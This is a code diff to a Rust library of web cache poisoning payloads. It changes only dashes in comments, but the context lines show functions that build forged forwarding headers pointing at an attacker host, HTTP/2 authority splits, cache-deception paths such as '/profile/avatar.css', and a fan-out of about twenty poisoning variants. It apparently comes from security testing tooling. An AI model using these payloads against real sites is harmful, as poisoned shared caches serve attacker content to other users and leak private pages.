@@ -52,7 +52,7 @@ pub fn x_forwarded_host(attacker_host: &str) -> String {
 
 /// Build `X-Forwarded-Scheme` to flip the origin's view from HTTPS
 /// to HTTP (or vice versa). Often the origin redirects based on
-/// scheme — attacker-influenced redirects get cached.
+/// scheme (attacker-influenced redirects get cached).
 #[must_use]
 pub fn x_forwarded_scheme(scheme: &str) -> String {
     format!("X-Forwarded-Scheme: {scheme}")
@@ -94,7 +94,7 @@ pub fn x_backend_host(attacker_host: &str) -> String {
     format!("X-Backend-Host: {attacker_host}")
 }
 
-/// X-Real-IP / X-Forwarded-For with private/loopback IP — some
+/// X-Real-IP / X-Forwarded-For with private/loopback IP, some
 /// applications grant elevated trust to loopback. Cache key isn't
 /// affected.
 #[must_use]
@@ -104,7 +104,7 @@ pub fn loopback_trust_header() -> String {
 
 /// Web cache deception path: append a cacheable extension to a
 /// dynamic endpoint. `/profile` is dynamic, `/profile/avatar.css`
-/// is the deception payload — cache fetches and stores under .css,
+/// is the deception payload, cache fetches and stores under .css,
 /// origin serves the profile dynamically.
 ///
 /// Returns variants across the 5 most-cached extensions.
@@ -156,7 +156,7 @@ pub fn cache_key_normalization_variants(base_path: &str) -> Vec<String> {
 
 /// Vary header confusion. Origin sets `Vary: User-Agent` but
 /// returns the same body regardless of UA. Cache stores N copies,
-/// one per attacker UA — each can carry distinct poison.
+/// one per attacker UA (each can carry distinct poison).
 #[must_use]
 pub fn vary_header_confusion(vary_on: &str) -> String {
     format!("Vary: {vary_on}")
@@ -182,7 +182,7 @@ pub fn h2_authority_split(attacker_authority: &str) -> String {
     format!(":authority: {attacker_authority}")
 }
 
-/// One-shot fan-out — every cache poisoning primitive for one
+/// One-shot fan-out, every cache poisoning primitive for one
 /// (attacker_host, target_path). Returns ~20 variants.
 #[must_use]
 pub fn all_cache_poison_payloads(
@@ -206,7 +206,7 @@ pub fn all_cache_poison_payloads(
         ("status-404-as-200", status_code_poison_header().to_string()),
         ("h2-authority-split", h2_authority_split(attacker_host)),
     ];
-    // Add cache-deception path variants — they're URL forms not
+    // Add cache-deception path variants, they're URL forms not
     // headers, but join into the variant set for completeness.
     for (i, p) in web_cache_deception_paths(target_path)
         .into_iter()
